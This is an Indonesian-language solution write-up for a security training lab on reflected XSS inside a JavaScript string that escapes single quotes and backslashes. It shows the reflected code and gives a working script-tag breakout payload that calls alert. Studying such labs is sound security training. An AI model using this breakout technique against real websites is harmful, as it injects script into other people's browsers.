# Reflected XSS into a JavaScript string with single quote and backslash escaped

Lab ini mengandung kerentanan **reflected cross-site scripting (XSS)** pada fitur pelacakan query pencarian. Refleksi terjadi di dalam **string JavaScript yang menggunakan tanda kutip tunggal**, dan karakter **backslash telah di-escape**.

Untuk menyelesaikan lab ini, lakukan serangan **cross-site scripting (XSS)** yang dapat keluar dari string JavaScript tersebut dan memanggil fungsi `alert`.


## Solusi

1. Masukkan string acak alfanumerik ke kotak pencarian, seperti `TESTING123`.

2. Perhatikan bahwa string acak tersebut direfleksikan di dalam **string JavaScript**.

```html
<script>
var searchTerms = 'TESTING123';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

3. Coba kirim payload:

```text 
test'payload
```

dan lihat bahwa tanda kutip tunggal kamu di-escape dengan backslash, sehingga kamu tidak bisa keluar dari string.

```html
<script>
var searchTerms = 'test\'payload';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

4. Ganti input dengan payload berikut untuk keluar dari blok script dan menyisipkan script baru:

```html 
</script><script>alert(1)</script>
```

5. Verifikasi dengan klik kanan → **Copy URL**, lalu buka di browser. Saat halaman dimuat, seharusnya muncul alert.
